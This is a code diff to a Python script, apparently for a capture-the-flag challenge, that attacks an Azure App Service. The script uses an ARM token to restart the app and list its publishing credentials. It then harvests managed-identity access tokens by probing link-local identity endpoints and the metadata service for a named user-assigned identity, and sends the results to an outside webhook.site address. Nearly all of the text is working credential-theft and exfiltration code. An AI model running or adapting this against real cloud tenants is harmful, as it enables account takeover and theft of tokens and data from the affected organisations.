@@ -52,6 +52,18 @@ arm = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token
     "scope": "https://management.azure.com/.default",
 })["access_token"]
 
+# Refresh the reporting worker before entering Kudu.  The managed-identity
+# sidecar is attached during App Service startup and may not be visible in an
+# already-warm Kudu container.
+try:
+    restart_url = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/restart?api-version=2023-01-01"
+    restart_req = urllib.request.Request(restart_url, data=b"", method="POST", headers={"Authorization": "Bearer " + arm})
+    urllib.request.urlopen(restart_req, timeout=30).read()
+    print("app-restart=ok")
+    time.sleep(10)
+except Exception as e:
+    print("app-restart=" + repr(e))
+
 pub = read_json(urllib.request.Request(
     "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/config/publishingcredentials/list?api-version=2023-01-01",
     data=b"{}", method="POST", headers={"Authorization": "Bearer " + arm, "Content-Type": "application/json"}))
@@ -83,10 +95,11 @@ def discover_identity_env():
         pass
     return merged
 _ENV = discover_identity_env()
-IE = _ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT") or "http://127.0.0.1:8081/msi/token"
+IE = _ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT") or "http://169.254.131.3:8081/msi/token"
 IH = _ENV.get("IDENTITY_HEADER") or _ENV.get("MSI_SECRET", "")
 LEGACY = bool(_ENV.get("MSI_ENDPOINT")) and not _ENV.get("IDENTITY_ENDPOINT")
 MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
+MICLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"
 HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
 OUT = "/home/site/wwwroot/ctf_flag_result"
 def emit(obj):
@@ -102,8 +115,21 @@ def save(obj):
         pass
 def token(resource):
     candidates = []
-    if IE and not IE.startswith("http://127.0.0.1:8081"):
-        candidates.append((IE + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01&mi_res_id=" + urllib.parse.quote(MIRES), ({"Secret": IH} if LEGACY else {"X-IDENTITY-HEADER": IH})))
+    # App Service's sidecar may be on a link-local address even when Kudu's
+    # own environment does not expose IDENTITY_ENDPOINT.  Try the exact
+    # client_id form used by the challenge, then the mi_res_id form.
+    endpoints = []
+    for ep in (IE, "http://169.254.131.3:8081/msi/token", "http://169.254.130.3:8081/msi/token"):
+        if ep and ep not in endpoints:
+            endpoints.append(ep)
+    for ep in endpoints:
+        for extra in (
+            "&client_id=" + urllib.parse.quote(MICLIENT),
+            "&mi_res_id=" + urllib.parse.quote(MIRES),
+            "",
+        ):
+            hdr = ({"Secret": IH} if LEGACY else {"X-IDENTITY-HEADER": IH})
+            candidates.append((ep + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01" + extra, hdr))
     for q in (
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=" + urllib.parse.quote(resource) + "&mi_res_id=" + urllib.parse.quote(MIRES),
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=" + urllib.parse.quote(resource) + "&mi_res_id=" + urllib.parse.quote(MIRES),
@@ -112,7 +138,7 @@ def token(resource):
     errors = []
     for q, headers in candidates:
         try:
-            data = json.loads(urllib.request.urlopen(urllib.request.Request(q, headers=headers), timeout=8).read().decode())
+            data = json.loads(urllib.request.urlopen(urllib.request.Request(q, headers=headers), timeout=4).read().decode())
             if data.get("access_token"):
                 emit({"stage":"identity-token","resource":resource,"endpoint":q.split("?")[0]})
                 return data["access_token"]
